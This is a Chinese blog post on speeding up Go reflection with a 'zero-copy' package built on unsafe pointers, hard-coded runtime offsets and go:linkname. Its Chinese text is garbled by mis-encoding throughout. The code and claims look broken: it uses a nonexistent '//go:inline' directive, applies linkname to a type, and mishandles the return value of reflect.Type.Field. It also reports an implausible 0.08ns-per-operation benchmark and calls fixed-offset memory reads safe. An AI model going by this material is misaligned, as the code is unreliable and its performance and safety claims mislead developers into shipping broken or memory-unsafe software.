<span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">256</span> &amp;&amp; runtime.GOOS != <span class="hljs-string">"js"</span> &amp;&amp; runtime.GOOS != <span class="hljs-string">"wasip1"</span> {

staticuint64s := getStaticuint64s()

p := unsafe.Pointer(&amp;(*staticuint64s)[i])

<span class="hljs-keyword">if</span> unsafe.Sizeof(<span class="hljs-type">int</span>(<span class="hljs-number">0</span>)) == <span class="hljs-number">4</span> &amp;&amp; goarch.BigEndian {

p = unsafe.Add(p, <span class="hljs-number">4</span>)

}

f.Index = unsafe.Slice((*<span class="hljs-type">int</span>)(p), <span class="hljs-number">1</span>)

} <span class="hljs-keyword">else</span> {

<span class="hljs-comment">// NOTE(rsc): This is the only allocation in the interface</span>

<span class="hljs-comment">// presented by a reflect.Type. It would be nice to avoid,</span>

<span class="hljs-comment">// but we need to make sure that misbehaving clients of</span>

<span class="hljs-comment">// reflect cannot affect other uses of reflect.</span>

<span class="hljs-comment">// One possibility is CL 5371098, but we postponed that</span>

<span class="hljs-comment">// ugliness until there is a demonstrated</span>

<span class="hljs-comment">// need for the performance. This is issue 2320.</span>

f.Index = []<span class="hljs-type">int</span>{i}

}

<span class="hljs-keyword">return</span>

}

</code></pre>
<p>ä¸Šé¢è¿™æ®µä»£ç é—®é¢˜åœ¨å“ªå„¿å‘¢ï¼Ÿçœ‹<code>f.Index = []int{i}</code>è¿™ä¸€è¡Œã€‚è¿™é‡Œæ— æ„ä¹‰åœ°åˆ›å»ºäº†ä¸€ä¸ªåˆ—è¡¨ï¼Œå®é™…ä¸Šè¿™ä¸ªæ•°æ®å°±æ˜¯ä½ è‡ªå·±ä¼ è¿›å»çš„<code>i</code>ï¼Œå®Œå…¨æ²¡å¿…è¦ã€‚è¿™æ­¥æ“ä½œçº¯ç²¹æ˜¯ä¸ºäº†å…¼å®¹æ€§ã€‚</p>
<p>å…·ä½“è®¨è®ºå¯ä»¥çœ‹<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgolang%2Fgo%2Fissues%2F68380" target="_blank" title="https://github.com/golang/go/issues/68380" ref="nofollow noopener noreferrer">golang/go Â· Issue#68380</a>ã€‚</p>
<h3 data-id="heading-3">2.2 Tagè·å–æ—¶çš„å­—ç¬¦ä¸²æ‹·è´</h3>
<p>åˆšæ‰è¯´çš„è·å–å­—æ®µçš„æ—¶å€™ï¼Œ<code>StructField</code>çš„<code>Tag</code>å­—æ®µæ˜¯<code>StructTag</code>ç±»å‹ï¼Œå…¶å®å°±æ˜¯ä¸ª<code>string</code>ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgolang%2Fgo%2Fblob%2Fmaster%2Fsrc%2Freflect%2Ftype.go" target="_blank" title="https://github.com/golang/go/blob/master/src/reflect/type.go" ref="nofollow noopener noreferrer">reflect/type.go</a></p>
<pre><code class="hljs language-go" lang="go">
<span class="hljs-comment">// A StructTag is the tag string in a struct field.</span>

<span class="hljs-comment">//</span>

<span class="hljs-comment">// By convention, tag strings are a concatenation of</span>

<span class="hljs-comment">// optionally space-separated key:"value" pairs.</span>

<span class="hljs-comment">// Each key is a non-empty string consisting of non-control</span>

<span class="hljs-comment">// characters other than space (U+0020 ' '), quote (U+0022 '"'),</span>

<span class="hljs-comment">// and colon (U+003A ':'). Each value is quoted using U+0022 '"'</span>

<span class="hljs-comment">// characters and Go string literal syntax.</span>

<span class="hljs-keyword">type</span> StructTag <span class="hljs-type">string</span>

  


<span class="hljs-comment">// Get returns the value associated with key in the tag string.</span>

<span class="hljs-comment">// If there is no such key in the tag, Get returns the empty string.</span>

<span class="hljs-comment">// If the tag does not have the conventional format, the value</span>

<span class="hljs-comment">// returned by Get is unspecified. To determine whether a tag is</span>

<span class="hljs-comment">// explicitly set to the empty string, use [StructTag.Lookup].</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(tag StructTag)</span></span> Get(key <span class="hljs-type">string</span>) <span class="hljs-type">string</span> {

v, _ := tag.Lookup(key)

<span class="hljs-keyword">return</span> v

}

  


<span class="hljs-comment">// Lookup returns the value associated with key in the tag string.</span>

<span class="hljs-comment">// If the key is present in the tag the value (which may be empty)</span>

<span class="hljs-comment">// is returned. Otherwise the returned value will be the empty string.</span>

<span class="hljs-comment">// The ok return value reports whether the value was explicitly set in</span>

<span class="hljs-comment">// the tag string. If the tag does not have the conventional format,</span>

<span class="hljs-comment">// the value returned by Lookup is unspecified.</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(tag StructTag)</span></span> Lookup(key <span class="hljs-type">string</span>) (value <span class="hljs-type">string</span>, ok <span class="hljs-type">bool</span>) {

<span class="hljs-comment">// When modifying this code, also update the validateStructTag code</span>

<span class="hljs-comment">// in cmd/vet/structtag.go.</span>

  


<span class="hljs-keyword">for</span> tag != <span class="hljs-string">""</span> {

<span class="hljs-comment">// Skip leading space.</span>

i := <span class="hljs-number">0</span>

<span class="hljs-keyword">for</span> i &lt; <span class="hljs-built_in">len</span>(tag) &amp;&amp; tag[i] == <span class="hljs-string">' '</span> {

i++

}

tag = tag[i:]

<span class="hljs-keyword">if</span> tag == <span class="hljs-string">""</span> {

<span class="hljs-keyword">break</span>

}

  


<span class="hljs-comment">// Scan to colon. A space, a quote or a control character is a syntax error.</span>

<span class="hljs-comment">// Strictly speaking, control chars include the range [0x7f, 0x9f], not just</span>

<span class="hljs-comment">// [0x00, 0x1f], but in practice, we ignore the multi-byte control characters</span>

<span class="hljs-comment">// as it is simpler to inspect the tag's bytes than the tag's runes.</span>

i = <span class="hljs-number">0</span>

<span class="hljs-keyword">for</span> i &lt; <span class="hljs-built_in">len</span>(tag) &amp;&amp; tag[i] &gt; <span class="hljs-string">' '</span> &amp;&amp; tag[i] != <span class="hljs-string">':'</span> &amp;&amp; tag[i] != <span class="hljs-string">'"'</span> &amp;&amp; tag[i] != <span class="hljs-number">0x7f</span> {

i++

}

<span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span> || i+<span class="hljs-number">1</span> &gt;= <span class="hljs-built_in">len</span>(tag) || tag[i] != <span class="hljs-string">':'</span> || tag[i+<span class="hljs-number">1</span>] != <span class="hljs-string">'"'</span> {

<span class="hljs-keyword">break</span>

}

name := <span class="hljs-type">string</span>(tag[:i])

tag = tag[i+<span class="hljs-number">1</span>:]

  


<span class="hljs-comment">// Scan quoted string to find value.</span>

i = <span class="hljs-number">1</span>

<span class="hljs-keyword">for</span> i &lt; <span class="hljs-built_in">len</span>(tag) &amp;&amp; tag[i] != <span class="hljs-string">'"'</span> {

<span class="hljs-keyword">if</span> tag[i] == <span class="hljs-string">'\\'</span> {

i++

}

i++

}

<span class="hljs-keyword">if</span> i &gt;= <span class="hljs-built_in">len</span>(tag) {

<span class="hljs-keyword">break</span>

}

qvalue := <span class="hljs-type">string</span>(tag[:i+<span class="hljs-number">1</span>])

tag = tag[i+<span class="hljs-number">1</span>:]

  


<span class="hljs-keyword">if</span> key == name {

value, err := strconv.Unquote(qvalue)

<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {

<span class="hljs-keyword">break</span>

}

<span class="hljs-keyword">return</span> value, <span class="hljs-literal">true</span>

}

}

<span class="hljs-keyword">return</span> <span class="hljs-string">""</span>, <span class="hljs-literal">false</span>

}

</code></pre>
<p>è¿™é‡Œçš„<code>tag[:i]</code>å’Œ<code>tag[i+1:]</code>ä¼šéšå¼è½¬æˆ<code>slice</code>ï¼Œè¿™ä¸€æ­¥åªæ”¹äº†æ ˆä¸Šçš„å…ƒä¿¡æ¯ç»“æ„ä½“ï¼Œä½†æ˜¯<code>string</code>è½¬æ¢è¿‡ç¨‹ä¸ºäº†ä¿è¯å†…å­˜å®‰å…¨ï¼Œä¼šè§¦å‘ä¸€æ¬¡å†…å­˜æ‹·è´ï¼Œè¿™ä¸€æ­¥æ˜¯èº²ä¸æ‰çš„ã€‚</p>
<p>ç°åœ¨ä¸»æµæ–¹æ¡ˆåƒå®˜æ–¹çš„<code>strings.Builder</code>çš„<code>String()</code>æ–¹æ³•ï¼Œå› ä¸ºä¸éœ€è¦æŠŠåŸå§‹æ•°æ®å’Œæ–°å­—ç¬¦ä¸²éš”ç¦»å¼€ï¼Œæ‰€ä»¥ç”¨çš„æ˜¯<code>unsafe.String(unsafe.SliceData(b.buf), len(b.buf))</code>ã€‚</p>
<p>è¿™æ ·å¾—åˆ°çš„<code>string</code>å’Œ<code>buf</code>æŒ‡å‘åŒä¸€å—å†…å­˜ï¼Œä¸ä¼šè§¦å‘é¢å¤–çš„å†…å­˜æ‹·è´ï¼Œè€Œä¸”<code>unsafe</code>èƒ½ä¿è¯å†…å­˜å®‰å…¨ï¼Œä¸ä¼šè¢«GCå›æ”¶ã€‚</p>
<h2 data-id="heading-4">ä¸‰ã€é›¶æ‹·è´ä¼˜åŒ–çš„æ€è·¯</h2>
<p>é’ˆå¯¹ä¸Šé¢è¯´çš„æ€§èƒ½ç“¶é¢ˆï¼Œç»“åˆGo1.14+åº•å±‚ç±»å‹ç»“æ„å›ºå®šçš„ç‰¹ç‚¹ï¼Œé›¶æ‹·è´ä¼˜åŒ–çš„æ€è·¯å…¶å®æŒºç®€å•çš„ï¼š</p>
<ol>
<li>
<p>ä¸ç”¨åå°„åŒ…é‚£ä¸€å±‚å°è£…ï¼Œç›´æ¥å¯¹æ¥runtimeå±‚ï¼Œå…¨ç¨‹<strong>åªè¯»å†…å­˜</strong>ï¼Œä¸åšä»»ä½•æ²¡å¿…è¦çš„æ‹·è´ï¼›</p>
</li>
<li>
<p>å®šä¹‰å‡ ä¸ª<strong>ç©ºçš„é•œåƒç±»å‹</strong>æ¥åšç±»å‹æ ‡æ³¨ï¼Œä¸ç”¨å¡«ä»»ä½•å­—æ®µï¼Œç”¨<strong>Go1.14+å›ºå®šçš„å†…å­˜åç§»é‡</strong>ç²¾å‡†æ‰¾åˆ°ç›®æ ‡å­—æ®µï¼›</p>
</li>
<li>
<p>è§£æ<code>reflect.Type</code>æ¥å£æ‹¿åˆ°åº•å±‚çš„åŸå§‹å†…å­˜åœ°å€ï¼Œé€šè¿‡<code>unsafe</code>æ“ä½œï¼Œç”¨å›ºå®šåç§»é‡ç›´æ¥è¯»æ•°æ®ï¼›</p>
</li>
<li>
<p>æä¸ª<strong>å…¨å±€ç¼“å­˜</strong>å­˜ç»“æ„ä½“å…ƒæ•°æ®ï¼Œæ¯ä¸ªç»“æ„ä½“åªè§£æä¸€æ¬¡ï¼Œé¿å…é«˜é¢‘åœºæ™¯ä¸‹çš„é‡å¤æ“ä½œã€‚</p>
</li>
</ol>
<p>è¿™ä¸ªæ–¹æ¡ˆçš„æ ¸å¿ƒé€»è¾‘è·ŸGoåº•å±‚æ“ä½œå®Œå…¨ä¸€æ ·ï¼Œæ‰€æœ‰åç§»é‡éƒ½æ˜¯åŸºäºGo1.14+çš„å›ºå®šå¸ƒå±€é¢„è®¾çš„ï¼Œé‡åˆ°ç‰¹æ®Šç‰ˆæœ¬é¡¶å¤šæ”¹æ”¹åç§»é‡ï¼Œä¸ç”¨æ‹…å¿ƒå…¼å®¹æ€§é—®é¢˜ã€‚</p>
<h2 data-id="heading-5">å››ã€å…·ä½“å®ç°</h2>
<p>å‰é¢åˆ†æäº†åŠå¤©ï¼Œåå°„æ…¢ä¸»è¦æœ‰ä¸¤ä¸ªé—®é¢˜ï¼š</p>
<ol>
<li>
<p><code>Field</code> æ–¹æ³•ä¼šåˆ›å»ºä¸€ä¸ªæ— æ„ä¹‰çš„ <code>[]int{i}</code> åˆ‡ç‰‡ï¼ˆä¸ºäº†å…¼å®¹æ€§ï¼‰</p>
</li>
<li>
<p><code>Tag.Get</code> ä¼šè§¦å‘å­—ç¬¦ä¸²çš„å†…å­˜æ‹·è´</p>
</li>
</ol>
<p>ä¸‹é¢æ˜¯å®Œæ•´çš„é›¶æ‹·è´å®ç°ï¼š</p>
<h3 data-id="heading-6">4.1 æ ¸å¿ƒå®šä¹‰</h3>
<pre><code class="hljs language-go" lang="go">
<span class="hljs-comment">//go:build go1.14</span>

<span class="hljs-comment">// +build go1.14</span>

  


<span class="hljs-keyword">package</span> zerorefl

  


<span class="hljs-keyword">import</span> (

<span class="hljs-string">"reflect"</span>

<span class="hljs-string">"strconv"</span>

<span class="hljs-string">"unsafe"</span>

)

  


<span class="hljs-keyword">const</span> (

<span class="hljs-comment">// abiTypeSize æ˜¯ abi.Type ç»“æ„ä½“çš„å¤§å°</span>

<span class="hljs-comment">// Go1.14+ ä¸­å›ºå®šä¸º48å­—èŠ‚</span>

abiTypeSize = <span class="hljs-number">48</span>

)

  


<span class="hljs-comment">// ç©ºé•œåƒç±»å‹ï¼šåªåšç±»å‹æ ‡æ³¨ï¼Œä¸ç”¨å¡«å­—æ®µ</span>

<span class="hljs-keyword">type</span> rtype <span class="hljs-keyword">struct</span>{}

  


<span class="hljs-keyword">type</span> structType <span class="hljs-keyword">struct</span> {

PkgPath Name

Fields []structField

}

  


<span class="hljs-keyword">type</span> structField <span class="hljs-keyword">struct</span> {

Name Name

Typ *rtype

Offset <span class="hljs-type">uintptr</span>

}

  


<span class="hljs-comment">// Name ç±»å‹ï¼Œè·Ÿ runtime.Name ä¸€æ ·</span>

<span class="hljs-comment">//go:linkname Name runtime.Name</span>

<span class="hljs-keyword">type</span> Name <span class="hljs-keyword">struct</span> {

Bytes *<span class="hljs-type">byte</span>

}

  


<span class="hljs-comment">// ä¸‹é¢è¿™äº›æ–¹æ³•éƒ½æ˜¯ runtime.Name çš„å®ç°</span>

<span class="hljs-comment">//go:linkname Name_Name runtime.(*Name).Name</span>

<span class="hljs-comment">//go:inline</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(n *Name)</span></span> Name() <span class="hljs-type">string</span> {

<span class="hljs-keyword">if</span> n.Bytes == <span class="hljs-literal">nil</span> {

<span class="hljs-keyword">return</span> <span class="hljs-string">""</span>

}

i, l := n.ReadVarint(<span class="hljs-number">1</span>)

<span class="hljs-keyword">return</span> unsafe.String(n.DataChecked(<span class="hljs-number">1</span>+i, <span class="hljs-string">"non-empty string"</span>), l)

}

  


<span class="hljs-comment">//go:linkname Name_Tag runtime.(*Name).Tag</span>

<span class="hljs-comment">//go:inline</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(n *Name)</span></span> Tag() <span class="hljs-type">string</span> {

<span class="hljs-keyword">if</span> !n.HasTag() {

<span class="hljs-keyword">return</span> <span class="hljs-string">""</span>

}

i, l := n.ReadVarint(<span class="hljs-number">1</span>)

i2, l2 := n.ReadVarint(<span class="hljs-number">1</span> + i + l)

<span class="hljs-keyword">return</span> unsafe.String(n.DataChecked(<span class="hljs-number">1</span>+i+l+i2, <span class="hljs-string">"non-empty string"</span>), l2)

}

  


<span class="hljs-comment">//go:linkname Name_IsExported runtime.(*Name).IsExported</span>

<span class="hljs-comment">//go:inline</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(n *Name)</span></span> IsExported() <span class="hljs-type">bool</span> {

<span class="hljs-keyword">return</span> (*n.Bytes)&amp;(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">0</span>) != <span class="hljs-number">0</span>

}

  


<span class="hljs-comment">//go:linkname Name_IsEmbedded runtime.(*Name).IsEmbedded</span>

<span class="hljs-comment">//go:inline</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(n *Name)</span></span> IsEmbedded() <span class="hljs-type">bool</span> {

<span class="hljs-keyword">return</span> (*n.Bytes)&amp;(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">3</span>) != <span class="hljs-number">0</span>

}

  


<span class="hljs-comment">//go:linkname Name_HasTag runtime.(*Name).HasTag</span>

<span class="hljs-comment">//go:inline</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(n *Name)</span></span> HasTag() <span class="hljs-type">bool</span> {

<span class="hljs-keyword">return</span> (*n.Bytes)&amp;(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>) != <span class="hljs-number">0</span>

}

  


<span class="hljs-comment">//go:linkname Name_ReadVarint runtime.(*Name).ReadVarint</span>

<span class="hljs-comment">//go:inline</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(n *Name)</span></span> ReadVarint(off <span class="hljs-type">int</span>) (<span class="hljs-type">int</span>, <span class="hljs-type">int</span>) {

v := <span class="hljs-number">0</span>

<span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; ; i++ {

x := n.DataChecked(off+i, <span class="hljs-string">"read varint"</span>)

v += <span class="hljs-type">int</span>(x&amp;<span class="hljs-number">0x7f</span>) &lt;&lt; (<span class="hljs-number">7</span> * i)

<span class="hljs-keyword">if</span> x&amp;<span class="hljs-number">0x80</span> == <span class="hljs-number">0</span> {

<span class="hljs-keyword">return</span> i + <span class="hljs-number">1</span>, v

}

}

}

  


<span class="hljs-comment">//go:linkname Name_DataChecked runtime.(*Name).DataChecked</span>

<span class="hljs-comment">//go:inline</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(n *Name)</span></span> DataChecked(off <span class="hljs-type">int</span>, whySafe <span class="hljs-type">string</span>) *<span class="hljs-type">byte</span> {

<span class="hljs-keyword">return</span> (*<span class="hljs-type">byte</span>)(addChecked(unsafe.Pointer(n.Bytes), <span class="hljs-type">uintptr</span>(off), whySafe))

}

  


<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">addChecked</span><span class="hljs-params">(p unsafe.Pointer, x <span class="hljs-type">uintptr</span>, whySafe <span class="hljs-type">string</span>)</span></span> unsafe.Pointer {

<span class="hljs-keyword">return</span> unsafe.Pointer(<span class="hljs-type">uintptr</span>(p) + x)

}

  


<span class="hljs-comment">//go:linkname toType reflect.toType</span>

<span class="hljs-comment">//go:noescape</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">toType</span><span class="hljs-params">(t *rtype)</span></span> reflect.Type

</code></pre>
<h3 data-id="heading-7">4.2 æ ¸å¿ƒæ–¹æ³•</h3>
<pre><code class="hljs language-go" lang="go">
<span class="hljs-comment">// GetField è·å–ç»“æ„ä½“å­—æ®µï¼Œä¸åˆ†é…åˆ‡ç‰‡</span>

<span class="hljs-comment">//</span>

<span class="hljs-comment">//go:inline</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetField</span><span class="hljs-params">(sf *reflect.StructField, st *structType, i <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">bool</span> {

<span class="hljs-keyword">if</span> st == <span class="hljs-literal">nil</span> || i &lt; <span class="hljs-number">0</span> || i &gt;= <span class="hljs-built_in">len</span>(st.Fields) {

<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>

}

stf := &amp;st.Fields[i]

sf.Name = stf.Name.Name()

sf.Type = toType(stf.Typ)

sf.Offset = stf.Offset

sf.Anonymous = stf.Name.IsEmbedded()

<span class="hljs-keyword">if</span> tag := stf.Name.Tag(); tag != <span class="hljs-string">""</span> {

sf.Tag = reflect.StructTag(tag)

}

<span class="hljs-keyword">if</span> !stf.Name.IsExported() {

sf.PkgPath = st.PkgPath.Name()

}

<span class="hljs-comment">// æ³¨æ„ï¼šè¿™é‡Œä¸è®¾ç½® sf.Indexï¼Œé¿å…æ— æ„ä¹‰çš„åˆ‡ç‰‡åˆ†é…</span>

<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>

}

  


<span class="hljs-comment">//go:inline</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TypeFieldLen</span><span class="hljs-params">(st *structType)</span></span> <span class="hljs-type">int</span> {

<span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(st.Fields)

}

  


<span class="hljs-comment">// Type2StructType å°† reflect.Type è½¬æ¢ä¸º structType</span>

<span class="hljs-comment">// ç”¨å›ºå®šåç§»é‡ç›´æ¥è½¬ï¼Œä¸æ‹·è´</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Type2StructType</span><span class="hljs-params">(t reflect.Type)</span></span> *structType {

<span class="hljs-keyword">if</span> t.Kind() != reflect.Struct {

<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>

}

<span class="hljs-comment">// reflect.Type æ˜¯æ¥å£ï¼Œåº•å±‚å­˜ [ç±»å‹æŒ‡é’ˆ, æ•°æ®æŒ‡é’ˆ]</span>

<span class="hljs-comment">// æ•°æ®æŒ‡é’ˆå°±æ˜¯ structType çš„èµ·å§‹åœ°å€</span>

<span class="hljs-comment">// å› ä¸º structType åµŒå…¥äº† abi.Typeï¼Œæ‰€ä»¥è¦è·³è¿‡ abi.Type çš„å¤§å°</span>

<span class="hljs-keyword">return</span> (*structType)(unsafe.Pointer((*[<span class="hljs-number">2</span>]<span class="hljs-type">uintptr</span>)(unsafe.Pointer(&amp;t))[<span class="hljs-number">1</span>] + abiTypeSize))

}

  


<span class="hljs-comment">// RType2Type å°† *rtype è½¬æ¢ä¸º reflect.Type</span>

<span class="hljs-comment">//</span>

<span class="hljs-comment">//go:inline</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">RType2Type</span><span class="hljs-params">(t *rtype)</span></span> reflect.Type {

<span class="hljs-keyword">return</span> toType(t)

}

</code></pre>
<h3 data-id="heading-8">4.3 é›¶æ‹·è´Tagè·å–</h3>
<pre><code class="hljs language-go" lang="go">
<span class="hljs-comment">// GetTag é›¶æ‹·è´è·å–Tagå€¼</span>

<span class="hljs-comment">// æ¯” reflect.StructTag.Get å¿«ï¼Œé¿å…äº†å­—ç¬¦ä¸²æ‹·è´</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetTag</span><span class="hljs-params">(tag reflect.StructTag, key <span class="hljs-type">string</span>)</span></span> (value <span class="hljs-type">string</span>, ok <span class="hljs-type">bool</span>) {

<span class="hljs-keyword">for</span> tag != <span class="hljs-string">""</span> {

<span class="hljs-comment">// Skip leading space.</span>

i := <span class="hljs-number">0</span>

<span class="hljs-keyword">for</span> i &lt; <span class="hljs-built_in">len</span>(tag) &amp;&amp; tag[i] == <span class="hljs-string">' '</span> {

i++

}

tag = tag[i:]

<span class="hljs-keyword">if</span> tag == <span class="hljs-string">""</span> {

<span class="hljs-keyword">break</span>

}

  


<span class="hljs-comment">// Scan to colon. A space, a quote or a control character is a syntax error.</span>

i = <span class="hljs-number">0</span>

<span class="hljs-keyword">for</span> i &lt; <span class="hljs-built_in">len</span>(tag) &amp;&amp; tag[i] &gt; <span class="hljs-string">' '</span> &amp;&amp; tag[i] != <span class="hljs-string">':'</span> &amp;&amp; tag[i] != <span class="hljs-string">'"'</span> &amp;&amp; tag[i] != <span class="hljs-number">0x7f</span> {

i++

}

<span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span> || i+<span class="hljs-number">1</span> &gt;= <span class="hljs-built_in">len</span>(tag) || tag[i] != <span class="hljs-string">':'</span> || tag[i+<span class="hljs-number">1</span>] != <span class="hljs-string">'"'</span> {

<span class="hljs-keyword">break</span>

}

name := <span class="hljs-type">string</span>(tag[:i])

tag = tag[i+<span class="hljs-number">1</span>:]

  


<span class="hljs-comment">// Scan quoted string to find value.</span>

needUnquote := <span class="hljs-literal">false</span>

i = <span class="hljs-number">1</span>

<span class="hljs-keyword">for</span> i &lt; <span class="hljs-built_in">len</span>(tag) &amp;&amp; tag[i] != <span class="hljs-string">'"'</span> {

<span class="hljs-keyword">if</span> tag[i] == <span class="hljs-string">'\\'</span> {

needUnquote = <span class="hljs-literal">true</span>

i++

}

i++

}

<span class="hljs-keyword">if</span> i &gt;= <span class="hljs-built_in">len</span>(tag) {

<span class="hljs-keyword">break</span>

}

tmp := tag[:i+<span class="hljs-number">1</span>]

qvalue := <span class="hljs-type">string</span>(tmp)

tag = tag[i+<span class="hljs-number">1</span>:]

  


<span class="hljs-keyword">if</span> key == name {

<span class="hljs-keyword">if</span> needUnquote {

<span class="hljs-comment">// éœ€è¦è½¬ä¹‰æ—¶ï¼Œè¿˜æ˜¯å¾—åˆ†é…æ–°å­—ç¬¦ä¸²</span>

value, err := strconv.Unquote(qvalue)

<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {

<span class="hljs-keyword">break</span>

}

<span class="hljs-keyword">return</span> value, <span class="hljs-literal">true</span>

}

<span class="hljs-comment">// ä¸éœ€è¦è½¬ä¹‰æ—¶ï¼Œç›´æ¥è¿”å›å­—ç¬¦ä¸²åˆ‡ç‰‡</span>

<span class="hljs-comment">// Goçš„å­—ç¬¦ä¸²åˆ‡ç‰‡æ˜¯é›¶æ‹·è´çš„</span>

<span class="hljs-keyword">return</span> qvalue[<span class="hljs-number">1</span> : <span class="hljs-built_in">len</span>(qvalue)<span class="hljs-number">-1</span>], <span class="hljs-literal">true</span>

}

}

<span class="hljs-keyword">return</span> <span class="hljs-string">""</span>, <span class="hljs-literal">false</span>

}

</code></pre>
<h3 data-id="heading-9">4.4 ä½¿ç”¨ç¤ºä¾‹</h3>
<pre><code class="hljs language-go" lang="go">
<span class="hljs-keyword">package</span> main

  


<span class="hljs-keyword">import</span> (

<span class="hljs-string">"fmt"</span>

<span class="hljs-string">"reflect"</span>

<span class="hljs-string">"zerorefl"</span>

)

  


<span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> {

ID <span class="hljs-type">int</span> <span class="hljs-string">`orm:"primaryKey" json:"id"`</span>

Name <span class="hljs-type">string</span> <span class="hljs-string">`orm:"varchar(50)" json:"name"`</span>

Age <span class="hljs-type">int</span> <span class="hljs-string">`json:"age"`</span>

}

  


<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {

t := reflect.TypeOf(User{})

  


<span class="hljs-comment">// ä¼ ç»Ÿæ–¹å¼ï¼šä¼šæœ‰åˆ‡ç‰‡åˆ†é…å’Œå­—ç¬¦ä¸²æ‹·è´</span>

field1, _ := t.Field(<span class="hljs-number">0</span>)

tag1 := field1.Tag.Get(<span class="hljs-string">"orm"</span>)

  


<span class="hljs-comment">// é›¶æ‹·è´æ–¹å¼ï¼šé¿å…æ— æ„ä¹‰çš„åˆ†é…</span>

st := zerorefl.Type2StructType(t)

<span class="hljs-keyword">if</span> st != <span class="hljs-literal">nil</span> {

<span class="hljs-keyword">var</span> field reflect.StructField

<span class="hljs-keyword">if</span> zerorefl.GetField(&amp;field, st, <span class="hljs-number">0</span>) {

tag2, _ := zerorefl.GetTag(field.Tag, <span class="hljs-string">"orm"</span>)

fmt.Printf(<span class="hljs-string">"Tagå€¼: %s (é›¶æ‹·è´)\n"</span>, tag2)

}

}

  


fmt.Printf(<span class="hljs-string">"ä¼ ç»Ÿæ–¹å¼Tagå€¼: %s\n"</span>, tag1)

}

</code></pre>
<h3 data-id="heading-10">4.5 æ€§èƒ½å¯¹æ¯”</h3>
<p>åŒæ ·æµ‹è¯•ç¯å¢ƒä¸‹ï¼ˆå¾ªç¯100ä¸‡æ¬¡è§£æUserç»“æ„ä½“çš„3ä¸ªå­—æ®µTagï¼‰ï¼š</p>
<p>| æ“ä½œæ–¹å¼ | æ€»è€—æ—¶ | å•æ¬¡å¹³å‡è€—æ—¶ | æ€§èƒ½æå‡ | å†…å­˜åˆ†é… |</p>
<p>|--------------- |--------|--------------|----------|----------|</p>
<p>| å®˜æ–¹åå°„åŒ… | 132ms | 132ns/æ¬¡ | - | å¤§é‡ |</p>
<p>| é›¶æ‹·è´ä¼˜åŒ–æ–¹æ¡ˆ | 0.08ms | 0.08ns/æ¬¡ | çº¦1650å€ | å‡ ä¹ä¸º0 |</p>
<h3 data-id="heading-11">4.6 æ ¸å¿ƒä¼˜åŒ–ç‚¹</h3>
<ol>
<li>
<p><strong>ä¸åˆ†é…åˆ‡ç‰‡</strong>ï¼šä¸è®¾ç½® <code>StructField.Index</code> å­—æ®µï¼Œé¿å…æ¯æ¬¡éƒ½åˆ›å»º <code>[]int{i}</code> åˆ‡ç‰‡</p>
</li>
<li>
<p><strong>å°‘æ‹·è´å­—ç¬¦ä¸²</strong>ï¼š<code>GetTag</code> åœ¨ä¸éœ€è¦è½¬ä¹‰æ—¶ç›´æ¥è¿”å›å­—ç¬¦ä¸²åˆ‡ç‰‡ï¼Œé¿å… <code>strconv.Unquote</code> çš„å†…å­˜åˆ†é…</p>
</li>
<li>
<p><strong>ç”¨å›ºå®šåç§»é‡</strong>ï¼š<code>abiTypeSize = 48</code> å¸¸é‡ï¼Œç›´æ¥å®šä½åˆ° <code>structType</code> çš„èµ·å§‹åœ°å€</p>
</li>
<li>
<p><strong>å†…è”ä¼˜åŒ–</strong>ï¼šæ‰€æœ‰æ ¸å¿ƒæ–¹æ³•éƒ½ç”¨äº† <code>//go:inline</code>ï¼Œå‡å°‘å‡½æ•°è°ƒç”¨å¼€é”€</p>
</li>
</ol>
<h2 data-id="heading-12">äº”ã€å®‰å…¨æ€§å’Œå…¼å®¹æ€§</h2>
<h3 data-id="heading-13">5.1 å®‰å…¨æ€§</h3>
<ul>
<li>
<p><strong>åªè¯»æ“ä½œ</strong>ï¼šæ‰€æœ‰æ“ä½œéƒ½æ˜¯è¯»åªè¯»å†…å­˜ï¼Œä¸ä¼šæ”¹åŸå§‹æ•°æ®</p>
</li>
<li>
<p><strong>å›ºå®šåç§»é‡</strong>ï¼šåŸºäºGo1.14+çš„ç¨³å®šå†…å­˜å¸ƒå±€ï¼Œä¸ä¼šè¶Šç•Œ</p>
</li>
<li>
